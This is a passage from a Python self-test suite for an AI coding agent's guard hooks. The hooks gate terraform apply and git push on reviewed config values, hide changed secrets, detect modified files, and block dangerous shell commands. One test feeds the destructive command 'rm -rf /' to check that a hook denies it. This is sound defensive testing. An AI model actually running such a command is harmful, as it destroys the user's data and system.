              rec["values"][2]["value"].startswith("sha256:") and "hunter2" not in json.dumps(rec), True)
        check("seal: unchanged tree → push allowed", gate_push().strip(), "")
        check("seal: a read-only command never triggers it", run("gate.py", dict(bash("git status", "seal"), cwd=Q),
              "pre", "preflight_seal", project=Q)[1].strip(), "")
        tfv.write_text('security_scan_enabled = true\nsql_db_owners = [\n  "app-identity",\n  "adf-identity",\n]\n'
                       'sql_admin_password = "hunter2"\nsku = "S1"\n', encoding="utf-8")
        out = gate_push()
        check("seal: 71e78ce case (scan flipped, ADF added) → ask naming both keys",
              (decision(out), "security_scan_enabled" in out and "adf-identity" in out), ("ask", True))
        check("seal: terraform apply is also checked", decision(gate_push("terraform apply -var-file=envs/qa.tfvars")), "ask")
        v = seal("verify", "--env", "qa", "--deployed", "71e78ce")
        check("seal verify: deployed commit isn't the cleared one", "NOT the cleared commit" in v and "security_scan_enabled" in v, True)
        tfv.write_text('security_scan_enabled = false\nsql_db_owners = [\n  "app-identity",\n]\nsql_admin_password = "changed"\nsku = "S1"\n',
                       encoding="utf-8")
        out = gate_push()
        check("seal: changed secret → ask without printing it",
              (decision(out), "secret changed" in out and "changed\"" not in out), ("ask", True))
        rec["expires_epoch"] = 0
        Path(Q, ".bobnet", "preflight-qa.json").write_text(json.dumps(rec), encoding="utf-8")
        check("seal: expired record → silent", gate_push().strip(), "")


    print("regressions from Homer's v0.4.2 review")
    sid = "hr1"  # report text mentioning "agentId: <word>" must not become a phantom spawn
    run("bobnet_mark.py", edit("src/x.py", "y", sid), project=P)
    sub_stop(sid, "realid99"); sub_stop(sid, "realid99", active=True)
    run("bobnet_mark.py", {"session_id": sid, "tool_name": "Agent", "tool_input": {},
                           "tool_response": {"content": [{"type": "text", "text": "Fixed: agentId: pending_agents ignored"}],
                                             "agentId": "realid99"}}, project=P)
    check("agent id comes from the field, not the report text", stop(sid), "block")
    if have_git:
        with tempfile.TemporaryDirectory() as R2:
            g2 = lambda *a, cwd=R2: subprocess.run(["git", "-c", "user.email=t@t", "-c", "user.name=t", *a],
                                                    cwd=cwd, capture_output=True)
            g2("init", "-q"); Path(R2, "f").write_text("a"); Path(R2, "sub").mkdir(); Path(R2, "sub", "s").write_text("a")
            g2("add", "."); g2("commit", "-qm", "init")
            Path(R2, "sub", "s").write_text("modified before the session")
            Path(R2, "newdir").mkdir(); Path(R2, "newdir", "n.txt").write_text("untracked")
            check("dirty: committing code together with the journal still counts",
                  dirty_after(R2, "hj", "git status", "git add f .bobnet/journal.md; git commit -qam wip",
                              between=lambda: (Path(R2, "f").write_text("z"), g2("add", "f"), g2("commit", "-qm", "wip"))), True)
            def append_sub():
                time.sleep(0.02); Path(R2, "sub", "s").write_text("modified again")
            SUB = str(Path(R2, "sub"))
            check("dirty: project dir is a repo subdirectory, re-edit counts",
                  dirty_after(SUB, "hsub", "ls", "./fmt.sh", between=append_sub), True)
            def append_untracked():
                time.sleep(0.02)
                with open(Path(R2, "newdir", "n.txt"), "a") as fh:
                    fh.write("more")
            check("dirty: in-place append inside an untracked directory counts",
                  dirty_after(R2, "hun", "ls", "./gen.sh", between=append_untracked), True)
        Path(P, "flags").mkdir(exist_ok=True)
        for c in ["terraform -chdir=envs apply", "tofu -chdir=x apply -auto-approve", "git -C . push origin main",
                  "kubectl -n prod apply -f k.yaml", "/usr/bin/terraform apply", "terragrunt apply"]:
            check(f"dirty: global flags before the verb, {c!r}", dirty_after(str(Path(P, "flags")), f"hf{abs(hash(c))}", c), True)
    with tempfile.TemporaryDirectory() as Q2:
        t = Path(Q2, "t.tfvars")
        t.write_text(
            'tags = {\n  enabled = "nested"\n  note = "has ] bracket"\n}\n'
            'enabled = false\n'
            'weird = "a\\\\"\n'
            'after_weird = 1\n'
            'list = [ # comment with [ bracket\n  "x",\n]\n'
            "semi = 'single [quote'\n"
            'cfg = <<EOT\nline [one\nEOT\n'
            'url = "x" // trailing\n'
            'sku="S1"\n', encoding="utf-8")
        sys.path.insert(0, str(HERE))
        import importlib
        ps = importlib.import_module("preflight_seal")
        for key, want in [("enabled", "false"), ("weird", '"a\\\\"'), ("after_weird", "1"), ("list", '[ "x", ]'),
                          ("semi", "'single [quote'"), ("cfg", "<<EOT line [one EOT"), ("url", '"x"'), ("sku", '"S1"'),
                          ("note", None)]:
            check(f"tfvars value: {key}", ps.read_value(t, key), want)
        Path(Q2, "envs").mkdir(); tq = Path(Q2, "envs", "qa.tfvars"); tq.write_text("scan = false\n", encoding="utf-8")
        subprocess.run([sys.executable, str(HERE / "preflight_seal.py"), "record", "--env", "qa", "--verdict", "GO",
                        "--sha", "abc", "--value", "envs/qa.tfvars:scan"], cwd=Q2, capture_output=True,
                       env=dict(os.environ, CLAUDE_PROJECT_DIR=Q2))
        tq.write_text("scan = true\n", encoding="utf-8")
        for c in ["terraform -chdir=envs apply", "git -C . push origin main", "/usr/bin/terraform apply",
                  '"terraform" apply', "terragrunt apply", "./bin/terraform apply"]:
            check(f"seal: deploy spelled another way, {c!r} → ask",
                  decision(run("gate.py", dict(bash(c, "hs"), cwd=Q2), "pre", "preflight_seal", project=Q2)[1]), "ask")


    print("robustness")
    check(
        "malformed JSON → fail open",
        decision(
            subprocess.run(
                [sys.executable, str(HERE / "busters.py")],
                input="{not json",
                capture_output=True,
                text=True,
            ).stdout
        ),
        "allow",
    )
    check(
        "empty stdin → fail open",
        decision(
            subprocess.run(
                [sys.executable, str(HERE / "suddar.py")],
                input="",
                capture_output=True,
                text=True,
            ).stdout
        ),
        "allow",
    )
    check(
        "alt field names (tool/input)",
        decision(
            run(
                "busters.py",
                {"tool": "Bash", "input": {"command": "rm -rf /"}},
                project=P,
            )[1]
        ),
        "deny",
    )

print()
if FAILS:
    print(f"{len(FAILS)} FAILED:\n  " + "\n  ".join(FAILS))
    sys.exit(1)
print("all hook self-tests passed")
